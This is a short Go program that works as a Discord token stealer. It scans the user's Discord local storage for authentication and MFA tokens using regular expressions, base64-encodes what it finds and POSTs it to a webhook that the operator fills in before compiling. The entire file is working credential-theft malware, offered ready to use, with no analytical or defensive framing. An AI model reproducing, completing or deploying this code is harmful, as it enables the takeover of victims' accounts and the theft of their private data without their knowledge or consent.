package main

import (
	"bytes"
	"encoding/base64"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func token() string {
	path := os.Getenv("APPDATA") + "/discord/Local Storage/leveldb"
	files, _ := ioutil.ReadDir(path)
	var tkn string = ""
	for _, f := range files {
		name := f.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
			token_file, _ := ioutil.ReadFile(path + "/" + name)
			file := string(token_file)
			tokenr := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
			mfa_tokenr := regexp.MustCompile(`mfa\.[\w-]{84}`)
			token := tokenr.FindString(file)
			mfa_token := mfa_tokenr.FindString(file)
			if len(mfa_token) > 4 {
				tkn = mfa_token
			} else if len(token) > 4 {
				tkn = token
			}
		}
	}
	return tkn
}
func webhook_send(webhook string, tkn string) {
	client := &http.Client{}
	data := `{"content":"` + "found token, (base64)\\ntoken: " + base64.StdEncoding.EncodeToString([]byte(tkn)) + `"}` // encode the token into base64 because discord might cause some issues if we just send it like it is
	req, _ := http.NewRequest("POST", webhook, bytes.NewBuffer([]byte(data)))
	req.Header.Add("content-type", "application/json")
	client.Do(req)
}
func main() {
	webhook := "" // add your webhook here before compiling
	tkn := token()
	webhook_send(webhook, tkn)
}
